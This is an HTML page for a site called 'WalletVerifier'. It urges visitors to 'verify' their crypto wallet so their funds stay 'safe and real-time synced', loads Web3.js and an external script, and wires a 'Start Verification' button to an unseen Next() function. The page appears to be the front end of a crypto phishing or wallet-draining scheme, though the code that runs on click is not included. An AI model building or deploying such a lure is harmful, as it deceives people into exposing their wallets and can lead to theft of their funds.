<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wallet Verifier</title>
  <link rel="stylesheet" href="css/style.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  
  <!-- Load Web3.js first -->
  <script src="js/web3.min.js"></script>
</head>
<body>

  <header>
    <div class="logo">WalletVerifier</div>
  </header>

  <main>
    <h1>Secure Wallet Asset Check</h1>
    <p>Verify your crypto wallet to ensure your funds are safe and real-time synced.</p>
    <button id="verifyBtn">Start Verification</button>
  </main>

  <footer>
    © 2025 <a href="#">WalletVerifier</a>. All rights reserved.
  </footer>

  <!-- Your script.js logic -->
  <script src="js/script.js"></script>

  <!-- Bind the button click to Next() (once only) -->
  <script>
    (function () {
      var btn = document.getElementById("verifyBtn");
      if (!btn || btn.dataset.nextBound) return;
      btn.dataset.nextBound = "1";
      btn.addEventListener("click", function () {
        if (typeof Next === "function") Next();
      });
    })();
  </script>



</body></html>
